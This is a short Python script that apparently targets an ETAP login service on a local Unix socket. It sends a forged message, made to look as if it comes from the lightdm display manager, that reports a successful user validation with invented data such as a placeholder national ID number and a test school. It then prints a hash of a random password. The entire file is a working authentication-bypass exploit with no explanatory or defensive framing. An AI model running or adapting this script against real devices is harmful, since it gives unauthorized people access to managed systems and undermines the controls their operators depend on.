#!/usr/bin/env python3
import socket
import json
import sys
import hashlib
import secrets

SOCKET_PATH = "/run/etap/qr-trigger"

if len(sys.argv) != 2:
    sys.exit(1)

username = sys.argv[1]
password = secrets.token_hex(16)
passwd_hash = hashlib.md5(password.encode()).hexdigest()

fake_validation = {
    "sender": "lightdm",
    "action": "register",
    "type": "validation",
    "status": "success",
    "user_data": {
        "hasRole": "0",
        "isEmailVerify": "0",
        "isForeign": "0",
        "isGuardian": "0",
        "selectedSchool": {
            "boroughId": "1",
            "boroughName": "TEST",
            "cityId": "999",
            "cityName": "TEST",
            "schoolId": "999999",
            "schoolName": "Test"
        },
        "taskId": "0",
        "tckn": "11111111111",
        "uid": password,
        "uname": username.upper(),
        "utype": "TESTUSER"
    }
}

try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(SOCKET_PATH)
    s.send(json.dumps(fake_validation).encode())
    s.close()
    print(passwd_hash)
except:
    sys.exit(1)
